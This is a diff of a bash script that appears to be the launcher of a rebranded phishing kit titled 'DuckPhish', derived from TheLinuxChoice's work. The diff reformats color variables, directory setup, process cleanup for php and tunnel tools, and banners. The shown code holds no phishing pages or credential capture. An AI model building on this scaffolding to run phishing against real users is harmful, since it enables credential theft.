@@ -90,55 +90,70 @@
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
+#!/bin/bash
+
+# Define version
 __version__="1.0.0"
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
-PORT='8080' 
+PORT='8080'
 
 ## ANSI colors (FG & BG)
-RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
-MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
-REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
-MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
+RED="$(printf '\033[31m')"  
+GREEN="$(printf '\033[32m')"  
+ORANGE="$(printf '\033[33m')"  
+BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"  
+CYAN="$(printf '\033[36m')"  
+WHITE="$(printf '\033[37m')"  
+BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"  
+GREENBG="$(printf '\033[42m')"  
+ORANGEBG="$(printf '\033[43m')"  
+BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"  
+CYANBG="$(printf '\033[46m')"  
+WHITEBG="$(printf '\033[47m')"  
+BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
 
 ## Directories
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
 
 if [[ ! -d ".server" ]]; then
-	mkdir -p ".server"
+    mkdir -p ".server"
 fi
 
 if [[ ! -d "auth" ]]; then
-	mkdir -p "auth"
+    mkdir -p "auth"
 fi
 
 if [[ -d ".server/www" ]]; then
-	rm -rf ".server/www"
-	mkdir -p ".server/www"
+    rm -rf ".server/www"
+    mkdir -p ".server/www"
 else
-	mkdir -p ".server/www"
+    mkdir -p ".server/www"
 fi
 
 ## Remove logfile
 if [[ -e ".server/.loclx" ]]; then
-	rm -rf ".server/.loclx"
+    rm -rf ".server/.loclx"
 fi
 
 if [[ -e ".server/.cld.log" ]]; then
-	rm -rf ".server/.cld.log"
+    rm -rf ".server/.cld.log"
 fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
-	exit 0
+    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+    exit 0
 }
 
 exit_on_signal_SIGTERM() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
-	exit 0
+    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+    exit 0
 }
 
 trap exit_on_signal_SIGINT SIGINT
@@ -146,60 +161,37 @@ trap exit_on_signal_SIGTERM SIGTERM
 
 ## Reset terminal colors
 reset_color() {
-	tput sgr0   # reset attributes
-	tput op     # reset color
-	return
+    tput sgr0   # reset attributes
+    tput op     # reset color
+    return
 }
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php cloudflared loclx"
-	for process in ${check_PID}; do
-		if [[ $(pidof ${process}) ]]; then # Check for Process
-			killall ${process} > /dev/null 2>&1 # Kill the Process
-		fi
-	done
+    check_PID="php cloudflared loclx"
+    for process in ${check_PID}; do
+        if [[ $(pidof ${process}) ]]; then # Check for Process
+            killall ${process} > /dev/null 2>&1 # Kill the Process
+        fi
+    done
 }
 
 # Check for a newer release
-check_update(){
+check_update() {
     echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} New Update.Contact RAyduan : "
-
+    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} New Update. Contact RAyduan : "
 }
-
-
 
 ## Check Internet Status
 check_status() {
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
-	timeout 3s curl -fIs "https://api.github.com" > /dev/null
-	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+    timeout 3s curl -fIs "https://api.github.com" > /dev/null
+    [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
-
-#!/bin/bash
-
-# Define color variables
-ORANGE='\033[0;33m'
-RED='\033[0;31m'
-BLUE='\033[0;34m'
-WHITE='\033[0;37m'
-
-# Define version
-__version__="1.0.0"
-
-#!/bin/bash
-
-# Define colors
-ORANGE='\033[38;5;214m'
-RED='\033[31m'
-BLUE='\033[34m'
-WHITE='\033[37m'
-__version__='1.0.0'  # Example version
 
 ## Banner
 banner() {
-	cat <<- EOF
+    cat <<- EOF
    ${ORANGE}                 ________                 __   __________.__    .__       .__     
    ${ORANGE}                 \\______ \\  __ __   ____ |  | _\\______   \\  |__ |__| _____|  |__  
    ${ORANGE}                   |    |  \\|  |  \\_/ ___\\|  |/ /|     ___/  |  \\|  |/  ___/  |  \\ 
@@ -211,7 +203,7 @@ banner() {
 
 ## Small Banner
 banner_small() {
-	cat <<- EOF
+    cat <<- EOF
 ${BLUE}  _____             _    _____  _     _     _     
 ${BLUE} |  __ \\           | |  |  __ \\| |   (_)   | |    
 ${BLUE} | |  | |_   _  ___| | _| |__) | |__  _ ___| |__  
